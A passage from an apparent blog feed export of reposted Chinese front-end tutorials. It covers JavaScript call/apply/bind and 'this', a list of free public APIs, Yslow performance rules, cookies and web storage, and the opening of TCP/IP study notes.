a.call(undefined);//window a.call(1); //Number a.call(&apos;&apos;); //String a.call(true); //Boolean a.call(b);// function b(){} a.call(obj); //Object 使用call方法调用匿名函数并且指定上下文的this在下面的例子中，当调用 greet 方法的时候，该方法的 this 值会绑定到 i对象。 function greet() { var reply = [this.person, &apos;是一个轻量的&apos;, this.role].join(&apos; &apos;); console.log(reply); } var i = { person: &apos;JSLite.io&apos;, role: &apos;Javascript 库。&apos; }; greet.call(i); // JSLite.io 是一个轻量的 Javascript 库。 使用call方法调用匿名函数在下例中的for循环体内，我们创建了一个匿名函数，然后通过调用该函数的call方法，将每个数组元素作为指定的this值执行了那个匿名函数。这个匿名函数的主要目的是给每个数组元素对象添加一个print方法，这个print方法可以打印出各元素在数组中的正确索引号。当然，这里不是必须得让数组元素作为this值传入那个匿名函数（普通参数就可以），目的是为了演示call的用法。 var animals = [ {species: &apos;Lion&apos;, name: &apos;King&apos;}, {species: &apos;Whale&apos;, name: &apos;Fail&apos;} ]; for (var i = 0; i &lt; animals.length; i++) { (function (i) { this.print = function () { console.log(&apos;#&apos; + i + &apos; &apos; + this.species + &apos;: &apos; + this.name); } this.print(); }).call(animals[i], i); } //#0 Lion: King //#1 Whale: Fail 使用call方法调用函数传参数var a = { name:&apos;JSLite.io&apos;, //定义a的属性 say:function(){ //定义a的方法 console.log(&quot;Hi,I&apos;m function a!&quot;); } }; function b(name){ console.log(&quot;Post params: &quot;+ name); console.log(&quot;I&apos;m &quot;+ this.name); this.say(); } b.call(a,&apos;test&apos;); //Post params: test //I&apos;m JSLite.io //I&apos;m function a! apply()语法与 call() 方法的语法几乎完全相同，唯一的区别在于，apply的第二个参数必须是一个包含多个参数的数组（或类数组对象）。apply的这个特性很重要，在调用一个存在的函数时，你可以为其指定一个 this对象。 this 指当前对象，也就是正在调用这个函数的对象。 使用 apply， 你可以只写一次这个方法然后在另一个对象中继承它，而不用在新对象中重复写该方法。 语法：fun.apply(thisArg[, argsArray]) 注意: 需要注意：Chrome 14 以及 Internet Explorer 9 仍然不接受类数组对象。如果传入类数组对象，它们会抛出异常。 参数thisArg同上call 的thisArg参数。argsArray一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。例子 function jsy(x,y,z){ console.log(x,y,z); } jsy.apply(null,[1,2,3]); // 1 2 3 使用apply来链接构造器的例子你可以使用apply来给一个对象链接构造器，类似于Java. 在接下来的例子中我们会创建一个叫做construct的全局的Function函数,来使你能够在构造器中使用一个类数组对象而非参数列表。 Function.prototype.construct = function(aArgs) { var fConstructor = this, fNewConstr = function() { fConstructor.apply(this, aArgs); }; fNewConstr.prototype = fConstructor.prototype; return new fNewConstr(); }; function MyConstructor () { for (var nProp = 0; nProp &lt; arguments.length; nProp++) { console.log(arguments,this) this[&quot;property&quot; + nProp] = arguments[nProp]; } } var myArray = [4, &quot;Hello world!&quot;, false]; var myInstance = MyConstructor.construct(myArray); console.log(myInstance.property1); // logs &quot;Hello world!&quot; console.log(myInstance instanceof MyConstructor); // logs &quot;true&quot; console.log(myInstance.constructor); // logs &quot;MyConstructor&quot; 使用apply和内置函数聪明的apply用法允许你在某些本来需要写成遍历数组变量的任务中使用内建的函数。在接下里的例子中我们会使用Math.max/Math.min来找出一个数组中的最大/最小值。 //里面有最大最小数字值的一个数组对象 var numbers = [5, 6, 2, 3, 7]; /* 使用 Math.min/Math.max 在 apply 中应用 */ var max = Math.max.apply(null, numbers); // 一般情况是用 Math.max(5, 6, ..) 或者 Math.max(numbers[0], ...) 来找最大值 var min = Math.min.apply(null, numbers); //通常情况我们会这样来找到数字的最大或者最小值 //比对上面的栗子，是不是下面的看起来没有上面的舒服呢？ max = -Infinity, min = +Infinity; for (var i = 0; i &lt; numbers.length; i++) { if (numbers[i] &gt; max) max = numbers[i]; if (numbers[i] &lt; min) min = numbers[i]; } 参数数组切块后循环传入 function minOfArray(arr) { var min = Infinity; var QUANTUM = 32768; for (var i = 0, len = arr.length; i &lt; len; i += QUANTUM) { var submin = Math.min.apply(null, arr.slice(i, Math.min(i + QUANTUM, len))); console.log(submin, min) min = Math.min(submin, min); } return min; } var min = minOfArray([5, 6, 2, 3, 7]); bindbind() 函数会创建一个新函数（称为绑定函数）1.bind() 函数会创建一个新函数（称为绑定函数）2.传参和call或apply类似3.不会执行对应的函数，call或apply会自动执行对应的函数4.返回对函数的引用 语法 fun.bind(thisArg[, arg1[, arg2[, ...]]]) 下面例子：当点击网页时，EventClick被触发执行，输出JSLite.io p1 p2, 说明EventClick中的this被bind改变成了obj对象。如果你将EventClick.bind(obj,&#39;p1&#39;,&#39;p2&#39;) 变成 EventClick.call(obj,&#39;p1&#39;,&#39;p2&#39;) 的话，页面会直接输出 JSLite.io p1 p2 var obj = {name:&apos;JSLite.io&apos;}; /** * 给document添加click事件监听，并绑定EventClick函数 * 通过bind方法设置EventClick的this为obj，并传递参数p1,p2 */ document.addEventListener(&apos;click&apos;,EventClick.bind(obj,&apos;p1&apos;,&apos;p2&apos;),false); //当点击网页时触发并执行 function EventClick(a,b){ console.log( this.name, //JSLite.io a, //p1 b //p2 ) } 兼容if (!Function.prototype.bind) { Function.prototype.bind = function (oThis) { if (typeof this !== &quot;function&quot;) { // closest thing possible to the ECMAScript 5 // internal IsCallable function throw new TypeError(&quot;Function.prototype.bind - what is trying to be bound is not callable&quot;); } var aArgs = Array.prototype.slice.call(arguments, 1), fToBind = this, // this在这里指向的是目标函数 fNOP = function () {}, fBound = function () { return fToBind.apply(this instanceof fNOP ? this //此时的this就是new出的obj : oThis || this,//如果传递的oThis无效，就将fBound的调用者作为this //将通过bind传递的参数和调用时传递的参数进行合并，并作为最终的参数传递 aArgs.concat(Array.prototype.slice.call(arguments))); }; fNOP.prototype = this.prototype; //将目标函数的原型对象拷贝到新函数中，因为目标函数有可能被当作构造函数使用 fBound.prototype = new fNOP(); //返回fBond的引用，由外部按需调用 return fBound; }; } 兼容例子来源于：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind#Compatibility 应用场景：继承function Animal(name,weight){ this.name = name; this.weight = weight; } function Cat(){ // 在call中将this作为thisArgs参数传递 // Animal方法中的this就指向了Cat中的this // 所以Animal中的this指向的就是cat对象 // 在Animal中定义了name和weight属性，就相当于在cat中定义了这些属性 // cat对象便拥有了Animal中定义的属性，从而达到了继承的目的 Animal.call(this,&apos;cat&apos;,&apos;50&apos;); //Animal.apply(this,[&apos;cat&apos;,&apos;50&apos;]); this.say = function(){ console.log(&quot;I am &quot; + this.name+&quot;,my weight is &quot; + this.weight); } } //当通过new运算符产生了cat时，Cat中的this就指向了cat对象 var cat = new Cat(); cat.say(); //输出=&gt; I am cat,my weight is 50 原型扩展在原型函数上扩展和自定义方法，从而不污染原生函数。例如：我们在 Array 上扩展一个 forEach function test(){ // 检测arguments是否为Array的实例 console.log( arguments instanceof Array, //false Array.isArray(arguments) //false ); // 判断arguments是否有forEach方法 console.log(arguments.forEach); // undefined // 将数组中的forEach应用到arguments上 Array.prototype.forEach.call(arguments,function(item){ console.log(item); // 1 2 3 4 }); } test(1,2,3,4); 转自：http://gold.xitu.io/post/57dc97f35bbb50005e5b39bd]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[不得不学的js技巧之关键字this🍭]]></title>
      <url>%2F2016%2F04%2F08%2F19%2F</url>
      <content type="text"><![CDATA[JavaScript的初学者，很容易迷惑于函数中的this关键字，本文简明扼要地说明了this的含义，包你读后不再迷惑。一句话解决疑问：函数中的this代表一个对象，具体是哪个对象取决于函数的调用方式。好的，现在问题变成了这样：函数有几种调用方式？每种调用方式中this代表哪个对象？ 调用方式一：直接调用设有如下函数： function setName(name) { this.name = name; } 我们现在直接调用它： setName(&apos;milter&apos;); 这时，函数setName中的this代表的是一个全局对象，这个对象是代码的宿主环境提供的，比如在浏览器中是window对象，在node.js中是global对象，如果宿主环境中没有提供这个全局对象，那么直接调用函数setName将会报错！ 调用方式二：new 调用还以上面的setName函数为例，new 调用是指这样： new setName(&#39;milter&#39;); 本人之前的文章讲过，对函数进行new 调用时，解释器会创建一个新的对象，this就指向这个新的对象，函数最后也会返回这个新的对象。 调用方式三：引用调用假设有这样一个对象： var person = { } 我们将函数setName赋值给person的一个属性，如下： person.setName = setName ; 此时，通过person.setName调用函数就是引用调用，如下： person.setName(&apos;milter&apos;); 引用调用函数时，this指向引用所属的对象，在上面的例子中，就是setName属性所属的对象person。 调用方式四：call和apply调用先说call调用，接着上面的例子，如下： setName.call(person,&apos;milter&apos;); call调用中，call的第一个参数就是this代表的对象，后面的参数代表传给函数的参数，上面的例子中，this指向person对象，setName函数的参数是字符串’milter’。 apply调用与call调用类似，第一个参数代表this对象，不同的是它用数组包含传给函数的参数。 调用方式五：bind调用所谓bind调用，请看示例： var binded = setName.bind(person); binded(&#39;milter&#39;); 在上面的binded调用中，this指向绑定的person对象。好了，基本就这五种函数调用方式，如果有遗漏的，欢迎补充。 转自：http://gold.xitu.io/post/57e48c0075c4cd2d9f3485f1]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[免费实用的API接口🌳]]></title>
      <url>%2F2016%2F04%2F05%2F18%2F</url>
      <content type="text"><![CDATA[早晨很安静，所以每次都喜欢在早晨整理整理资料，中午太困，晚上太浮躁，而我不喜欢熬夜。是不是有人会笑话：做一个程序员怎么能不会熬夜？如果你想学习编程，但是找不到学习路径和资源，欢迎关注专栏：学习编程今天的内容，很适合你去做一些好玩、实用的东西出来。先来科普个概念，开放应用程序的API（即Application Program Interface，应用程序接口）可以让开发者在无需访问源码，或理解内部工作机制细节的情况下，调用他人共享的功能和资源。对于数据源的获取上API是个好伙伴。所以有了这些内容，本文分为两个部分，第一部分是平台的接口汇总，第二部分是非常实用的单个的接口汇总。 第一部分1、聚合数据（API数据接口_开发者数据定制） 2、百度API Store（API集市_APIStore） 2、webxml（确实不错）[WebXml | WEB服务 第二部分1、地图接口阿里云根据经纬度获取地区名接口：http://gc.ditu.aliyun.com/reg阿里云根据地区名获取经纬度接口：http://gc.ditu.aliyun.com/geoc苏州市参数解释: 纬度,经度type 001 (100代表道路，010代表POI，001代表门址，111可以同时显示前三项) 2、查ip接口太平洋接口太平洋网络IP地址查询Web接口淘宝接口http://ip.taobao.com/service/g新浪接口http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&amp;ip=117.89.35.58 3、电商接口京东 商品接口http://p.3.cn/prices/mgets?…商品ID&amp;type=1 4、音乐接口豆瓣音乐 http://www.douban.com/j/app/radio/百度音乐 http://box.zhangmen.baidu.com/…歌名$$歌虾米 http://kuang.xiami.com/app/nin…歌曲名称/diandian/1/page/歌曲当前页?_=当前毫秒&amp;callback=getXiamiDataQQ空间音乐 http://qzone-music.qq.com/fcg-…号码&amp;json=1&amp;g_tk=1916754934多米音乐 http://v5.pc.duomi.com/search-关键字&amp;pi=页码&amp;pz=每页音乐数 5、翻译、词典接口腾讯：http://dict.qq.com/dict?…词语有道翻译：有道翻译API爱词霸：http://dict-co.iciba.com/search.php?word=词语&amp;submit=提交 6、酒店住宿接口住哪网开放平台 7、腾讯qq相关的接口API列表 - 腾讯开放平台 8、物流接口http://www.kuaidi100.com/query?..快递公司代号&amp;postid=快递单号ps:快递公司编码:申通=”shentong” EMS=”ems” 顺丰=”shunfeng” 圆通=”yuantong” 中通=”zhongtong” 韵达=”yunda” 天天=”tiantian” 汇通=”huitongkuaidi” 全峰=”quanfengkuaidi” 德邦=”debangwuliu” 宅急送=”zhaijisong”利用以上一些接口是些过一些简单的聚合，比如这个做了一个机器人订阅号 转自：https://zhuanlan.zhihu.com/p/21320392?refer=passer]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端的性能优化都有哪些东西？👍]]></title>
      <url>%2F2016%2F04%2F02%2F17%2F</url>
      <content type="text"><![CDATA[前端性能优化是个巨大的课题，如果要面面俱到的说的话，估计三天三夜说不完。所以我们就从实际的工程应用角度出发，聊我们最常遇见的前端优化问题。Yslow是雅虎开发的基于网页性能分析浏览器插件，可以检测出网页的具体性能值，并且有著名的Yslow 23条优化规则，这23条，就够我们玩的了。 1. 减少HTTP请求次数尽量合并图片、CSS、JS。比如加载一个页面，如果有5个css文件的话，那么会发出5次http请求，这样会让用户第一次访问你的页面的时候会长时间等待。而如果把这个5个文件合成一个的话，就只需要发出一次http请求，节省网络请求时间，加快页面的加载。 2. 使用CDN网站上静态资源即css、js全都使用cdn分发，图片亦然。 3. 避免空的src和href当link标签的href属性为空、script标签的src属性为空的时候，浏览器渲染的时候会把当前页面的URL作为它们的属性值，从而把页面的内容加载进来作为它们的值。所以要避免犯这样的疏忽。 4. 为文件头指定ExpiresExipres是用来设置文件的过期时间的，一般对css、js、图片资源有效。 他可以使内容具有缓存性，这样下回再访问同样的资源时就通过浏览器缓存区读取，不需要再发出http请求。如下例子：新浪微博的这个css文件的Expires时间是2016-5-04 09:14:14. 5. 使用gzip压缩内容gzip能够压缩任何一个文本类型的响应，包括html，xml，json。大大缩小请求返回的数据量。 6. 把CSS放到顶部网页上的资源加载时从上网下顺序加载的，所以css放在页面的顶部能够优先渲染页面，让用户感觉页面加载很快。 7. 把JS放到底部加载js时会对后续的资源造成阻塞，必须得等js加载完才去加载后续的文件 ，所以就把js放在页面底部最后加载。 8. 避免使用CSS表达式举个css表达式的例子font-color: expression( (new Date()).getHours()%3 ? “#FFFFFF” : “#AAAAAA” );这个表达式会持续的在页面上计算样式，影响页面的性能。并且css表达式只被IE支持。 9. 将CSS和JS放到外部文件中目的是缓存文件，可以参考原则4。 但有时候为了减少请求，也会直接写到页面里，需根据PV和IP的比例权衡。 10. 权衡DNS查找次数减少主机名可以节省响应时间。但同时，需要注意，减少主机会减少页面中并行下载的数量。IE浏览器在同一时刻只能从同一域名下载两个文件。当在一个页面显示多张图片时，IE 用户的图片下载速度就会受到影响。所以新浪会搞N个二级域名来放图片。下面是新浪微博的图片域名，我们可以看到他有多个域名，这样可以保证这些不同域名能够同时去下载图片，而不用排队。不过如果当使用的域名过多时，响应时间就会慢，因为不用响应域名时间不一致。 11. 精简CSS和JS这里就涉及到css和js的压缩了。比如下面的新浪的一个css文件，把空格回车全部去掉，减少文件的大小。现在的压缩工具有很多，基本主流的前端构建工具都能进行css和js文件的压缩，如grunt，glup等。 12. 避免跳转有种现象会比较坑爹，看起来没什么差别，其实多次了一次页面跳转。比如当URL本该有斜杠（/）却被忽略掉时。例如，当我们要访问 baidu.com 时，实际上返回的是一个包含301代码的跳转，它指向的是 baidu.com/（注意末尾的斜杠）。在nginx服务器可以使用rewrite；Apache服务器中可以使用Alias 或者 mod_rewrite或者the DirectorySlash来避免。另一种是不用域名之间的跳转， 比如访问 baidu.com/bbs 跳转到bbs.baidu.com/。那么可以通过使用Alias或者mod_rewirte建立CNAME（保存一个域名和另外一个域名之间关系的DNS记录）来替代。 13. 删除重复的JS和CSS重复调用脚本，除了增加额外的HTTP请求外，多次运算也会浪费时间。在IE和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。 14. 配置ETags它用来判断浏览器缓存里的元素是否和原来服务器上的一致。比last-modified date更具有弹性，例如某个文件在1秒内修改了10次，Etag可以综合Inode(文件的索引节点(inode)数)，MTime(修改时间)和Size来精准的进行判断，避开UNIX记录MTime只能精确到秒的问题。 服务器集群使用，可取后两个参数。使用ETags减少Web应用带宽和负载 15. 可缓存的AJAX异步请求同样的造成用户等待，所以使用ajax请求时，要主动告诉浏览器如果该请求有缓存就去请求缓存内容。如下代码片段, cache:true就是显式的要求如果当前请求有缓存的话，直接使用缓存 $.ajax({ url : &apos;url&apos;, dataType : &quot;json&quot;, cache: true, success : function(son, status){ } 16. 使用GET来完成AJAX请求当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数据。因此使用GET获取数据时更加有意义。 17. 减少DOM元素数量这是一门大学问，这里可以引申出一堆优化的细节。想要具体研究的可以看后面推荐书籍。总之大原则减少DOM数量，就会减少浏览器的解析负担。 18. 避免404比如外链的css、js文件出现问题返回404时，会破坏浏览器的并行加载。 19. 减少Cookie的大小Cookie里面别塞那么多东西，因为每个请求都得带着他跑。 20. 使用无cookie的域比如CSS、js、图片等，客户端请求静态文件的时候，减少了 Cookie 的反复传输对主域名的影响。 21. 不要使用滤镜IE独有属性AlphaImageLoader用于修正7.0以下版本中显示PNG图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。完全避免使用AlphaImageLoader的最好方法就是使用PNG8格式来代替，这种格式能在IE中很好地工作。如果你确实需要使用AlphaImageLoader，请使用下划线_filter又使之对IE7以上版本的用户无效。 22. 不要在HTML中缩放图片比如你需要的图片尺寸是50 50那就不用用一张500500的大尺寸图片，影响加载 23. 缩小favicon.ico并缓存以上是Yslow的23个优化原则，基本可以涵盖现在前端大部分的性能优化原则了，很多更加geek和精细优化方法都是从这些原则里面延伸出来的。 具体想了解更多优化细则的童鞋建议去看看下面的一本书，毕竟页数多讲的也细嘛：《高性能网站建设指南（第二版》，这里面其实就是细化的讲解了上面的23原则。前端优化是条漫长的路，不是说一天两天就能全部做完的。我们可以参考上面的准则去把我们目前能做的都给优化了，剩下的更加小的一些细节点不用太过着急，毕竟也是要考虑优化性价比的。比如为了减小一个文件几个字节花上个把月根本不值得。这些优化的东西都可以在我们的工作中慢慢去通过积累，去通过google解决。如果想了解更多前端知识，可以跑去这里看看：系统学习前端知识 转自：http://www.jianshu.com/p/ce90a60a0a77]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[本地存储小结💘]]></title>
      <url>%2F2016%2F03%2F28%2F16%2F</url>
      <content type="text"><![CDATA[前言总括：详细讲述Cookie,LocalStorge,SesstionStorge的区别和用法。 人生如画，岁月如歌。原文博客地址：Javascript本地存储小结知乎专栏&amp;&amp;简书专题：前端进击者（知乎）&amp;&amp;前端进击者（简书） 1. 各种存储方案的简单对比 Cookies：浏览器均支持，容量为4KB UserData：仅IE支持，容量为64KB Flash：100KB，非HTML原生，需要插件支持 Google Gears SQLite ：需要插件支持，容量无限制 LocalStorage：HTML5，容量为5M SesstionStorage：HTML5，容量为5M globalStorage：Firefox独有的，Firefox13开始就不再支持这个方法 UserData仅IE支持， Google Gears SQLite需要插件，Flash已经伴随着HTML5的出现渐渐退出了历史舞台，因此今天我们的主角只有他们三个：Cookie,LocalStorge,SesstionStorge; 2. Cookie作为一个前端和Cookie打交道的次数肯定不会少了，Cookie算是比较古老的技术了。1993 年，网景公司雇员 Lou Montulli 为了让用户在访问某网站时，进一步提高访问速度，同时也为了进一步实现个人化网络，发明了今天广泛使用的 Cookie。 1）cookie的大小受限制，cookie大小被限制在4KB，不能接受像大文件或邮件那样的大数据。 2）只要有请求涉及cookie，cookie就要在服务器和浏览器之间来回传送（这解释为什么本地文件不能测试cookie）。而且cookie数据始终在同源的http请求中携带（即使不需要），这也是Cookie不能太大的重要原因。正统的cookie分发是通过扩展HTTP协议来实现的，服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。 3）用户每请求一次服务器数据，cookie则会随着这些请求发送到服务器，服务器脚本语言如PHP等能够处理cookie发送的数据，可以说是非常方便的。当然前端也是可以生成Cookie的，用js对cookie的操作相当的繁琐，浏览器只提供document.cookie这样一个对象，对cookie的赋值，获取都比较麻烦。而在PHP中，我们可以通过setcookie()来设置cookie，通过$_COOKIE这个超全局数组来获取cookie。 cookie的内容主要包括：名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览器会话期的cookie被称为会话cookie。会话cookie一般不存储在硬盘上而是保存在内存里，当然这种行为并不是规范规定的。若设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再次打开浏览器，这些cookie仍然有效直到超过设定的过期时间。存储在硬盘上的cookie可以在不同的浏览器进程间共享，比如两个IE窗口。而对于保存在内存里的cookie，不同的浏览器有不同的处理方式。 2.2 Session说到Cookie就不能不说Session。 Session机制。session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识（称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用（检索不到，会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应中返回给客户端保存。保存这个session id的方式可以采用cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给服务器。一般这个cookie的名字都是类似于SEEESIONID。但cookie可以被人为的禁止，则必须有其他机制以便在cookie被禁止时仍然能够把session id传递回服务器。经常被使用的一种技术叫做URL重写，就是把session id直接附加在URL路径的后面。比如：http://damonare.cn?sessionid=123456还有一种技术叫做表单隐藏字段。就是服务器会自动修改表单，添加一个隐藏字段，以便在表单提交时能够把session id传递回服务器。比如： &lt;form name=&quot;testform&quot; action=&quot;/xxx&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sessionid&quot; value=&quot;123456&quot;&gt; &lt;input type=&quot;text&quot;&gt; &lt;/form&gt; 实际上这种技术可以简单的用对action应用URL重写来代替。 2.3 Cookie和Session简单对比Cookie和Session 的区别：1）cookie数据存放在客户的浏览器上，session数据放在服务器上。2）cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到安全应当使用session。3）session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用cookie。 4）单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。5）所以建议：a.将登陆信息等重要信息存放为SESSION b.其他信息如果需要保留，可以放在cookie中 2.4 document.cookie的属性expires属性指定了coolie的生存期，默认情况下coolie是暂时存在的，他们存储的值只在浏览器会话期间存在，当用户推出浏览器后这些值也会丢失，如果想让cookie存在一段时间，就要为expires属性设置为未来的一个过期日期。现在已经被max-age属性所取代，max-age用秒来设置cookie的生存期。 path属性它指定与cookie关联在一起的网页。在默认的情况下cookie会与创建它的网页，该网页处于同一目录下的网页以及与这个网页所在目录下的子目录下的网页关联。 domain属性domain属性可以使多个web服务器共享cookie。domain属性的默认值是创建cookie的网页所在服务器的主机名。不能将一个cookie的域设置成服务器所在的域之外的域。例如让位于order.damonare.cn的服务器能够读取catalog.damonare.cn设置的cookie值。如果catalog.damonare.cn的页面创建的cookie把自己的path属性设置为“/”，把domain属性设置成“.damonare.cn”，那么所有位于catalog.damonare.cn的网页和所有位于orlders.damonare.cn的网页，以及位于damonare.cn域的其他服务器上的网页都可以访问这个cookie。 secure属性它是一个布尔值，指定在网络上如何传输cookie，默认是不安全的，通过一个普通的http连接传输。 2.5 cookie实战这里我们使用javascript来写一段cookie,借用w3cschool的demo: function getCookie(c_name){ if (document.cookie.length&gt;0){ c_start=document.cookie.indexOf(c_name + &quot;=&quot;) if (c_start!=-1){ c_start=c_start + c_name.length+1 c_end=document.cookie.indexOf(&quot;;&quot;,c_start) if (c_end==-1) c_end=document.cookie.length return unescape(document.cookie.substring(c_start,c_end)) } } return &quot;&quot;; } function setCookie(c_name,value,expiredays){ var exdate=new Date() exdate.setDate(exdate.getDate()+expiredays) document.cookie=c_name+ &quot;=&quot; +escape(value)+ ((expiredays==null) ? &quot;&quot; : &quot;; expires=&quot;+exdate.toUTCString()) } function checkCookie(){ username=getCookie(&apos;username&apos;) if(username!=null &amp;&amp; username!=&quot;&quot;){alert(&apos;Welcome again &apos;+username+&apos;!&apos;)} else{ username=prompt(&apos;Please enter your name:&apos;,&quot;&quot;) if (username!=null &amp;&amp; username!=&quot;&quot;){ setCookie(&apos;username&apos;,username,355) } } } 注意这里对Cookie的生存期进行了定义，也就是355天 3. localStorage这是一种持久化的存储方式，也就是说如果不手动清除，数据就永远不会过期。它也是采用Key - Value的方式存储数据，底层数据接口是sqlite，按域名将数据分别保存到对应数据库文件里。它能保存更大的数据（IE8上是10MB，Chrome是5MB），同时保存的数据不会再发送给服务器，避免带宽浪费。 3.1 localStorage的属性方法下表是localStorge的一些属性和方法 属性方法 说明 localStorage.length 获得storage中的个数 localStorage.key(n) 获得storage中第n个元素对的键值（第一个元素是0） localStorage.getItem(key) 获取键值key对应的值 localStorage.key 获取键值key对应的值 localStorage.setItem(key, value) 添加数据，键值为key，值为value localStorage.removeItem(key) 移除键值为key的数据 localStorage.clear() 清除所有数据 3.2 localStorage的缺点① localStorage大小限制在500万字符左右，各个浏览器不一致② localStorage在隐私模式下不可读取③ localStorage本质是在读写文件，数据多的话会比较卡（firefox会一次性将数据导入内存，想想就觉得吓人啊）④ localStorage不能被爬虫爬取，不要用它完全取代URL传参 4. sessionStorage和服务器端使用的session类似，是一种会话级别的缓存，关闭浏览器会数据会被清除。不过有点特别的是它的作用域是窗口级别的，也就是说不同窗口间的sessionStorage数据不能共享的。使用方法（和localStorage完全相同）： 属性方法 说明 sessionStorage.length 获得storage中的个数 sessionStorage.key(n) 获得storage中第n个元素对的键值（第一个元素是0） sessionStorage.getItem(key) 获取键值key对应的值 sessionStorage.key 获取键值key对应的值 sessionStorage.setItem(key, value) 添加数据，键值为key，值为value sessionStorage.removeItem(key) 移除键值为key的数据 sessionStorage.clear() 清除所有数据 5. sessionStorage和localStorage的区别1.sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。当用户关闭浏览器窗口后，数据立马会被删除。2.localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。第二天、第二周或下一年之后，数据依然可用。 5.1 测试sessionStorage:if (sessionStorage.pagecount){ sessionStorage.pagecount=Number(sessionStorage.pagecount) +1; }else{ sessionStorage.pagecount=1; } console.log(&quot;Visits &quot;+ sessionStorage.pagecount + &quot; time(s).&quot;); 测试过程：我们在控制台输入上述代码查看打印结果控制台首次输入代码：关闭窗口，控制台再次输入代码：所谓的关闭窗口即销毁，就是这样，关闭窗口重新打开输入代码输出结果还是上面图片的样子，也就是说关闭窗口后sessionStorage.pagecount即被销毁，除非重心创建。或者从历史记录进入才会相关数据才会存在。好的，我们再来看下localStorge表现： if (localStorage.pagecount){ localStorage.pagecount=Number(localStorage.pagecount) +1; }else{ localStorage.pagecount=1; } console.log(&quot;Visits &quot;+ localStorage.pagecount + &quot; time(s).&quot;); 控制台首次输入代码：localStorage测试结果1 关闭窗口，控制台再次输入代码：localStorage测试结果2 6. web Storage和cookie的区别Web Storage(localStorage和sessionStorage)的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。但是Cookie也是不可以或缺的：Cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生 后记博主尽可能思路清晰的理了一遍cookie，session，localStorage，sessionStorage之间的区别和联系，希望可以帮到大家。参考文章：cookie 和session 的区别详解 转自：http://gold.xitu.io/post/582c7d330ce463006ce33838]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TCP/IP🌿]]></title>
      <url>%2F2016%2F03%2F25%2F14%2F</url>
      <content type="text"><![CDATA[TCP/IP详解学习笔记 这位仁兄写得太好了http://blog.csdn.net/goodboy1881/category/204448.aspxTCP/IP详解学习笔记(13)-TCP坚持定时器，TCP保活定时器TCP/IP详解学习笔记(12)-TCP的超时与重传TCP/IP详解学习笔记(11)-TCP交互数据流，成块数据流 TCP/IP详解学习笔记(1)-基本概念为什么会有TCP/IP协议在世界上各地，各种各样的电脑运行着各自不同的操作系统为大家服务，这些电脑在表达同一种信息的时候所使用的方法是千差万别。就好像圣经中上帝打乱了各地人的口音，让他们无法合作一样。计算机使用者意识到，计算机只是单兵作战并不会发挥太大的作用。只有把它们联合起来，电脑才会发挥出它最大的潜力。于是人们就想方设法的用电线把电脑连接到了一起。但是简单的连到一起是远远不够的，就好像语言不同的两个人互相见了面，完全不能交流信息。因而他们需要定义一些共通的东西来进行交流，TCP/IP就是为此而生。TCP/IP不是一个协议，而是一个协议族的统称。里面包括了IP协议，IMCP协议，TCP协议，以及我们更加熟悉的http、ftp、pop3协议等等。电脑有了这些，就好像学会了外语一样，就可以和其他的计算机终端做自由的交流了。 TCP/IP协议分层提到协议分层，我们很容易联想到ISO-OSI的七层协议经典架构，但是TCP/IP协议族的结构则稍有不同。如图所示 TCP/IP协议族按照层次由上到下，层层包装。最上面的就是应用层了，这里面有http，ftp,等等我们熟悉的协议。而第二层则是传输层，著名的TCP和UDP协议就在这个层次（不要告诉我你没用过udp玩星际）。第三层是网络层，IP协议就在这里，它负责对数据加上IP地址和其他的数据（后面会讲到）以确定传输的目标。第四层是叫数据链路层，这个层次为待传送的数据加入一个以太网协议头，并进行CRC编码，为最后的数据传输做准备。再往下则是硬件层次了，负责网络的传输，这个层次的定义包括网线的制式，网卡的定义等等（这些我们就不用关心了，我们也不做网卡），所以有些书并不把这个层次放在tcp/ip协议族里面，因为它几乎和tcp/ip协议的编写者没有任何的关系。发送协议的主机从上自下将数据按照协议封装，而接收数据的主机则按照协议从得到的数据包解开，最后拿到需要的数据。这种结构非常有栈的味道，所以某些文章也把tcp/ip协议族称为tcp/ip协议栈。 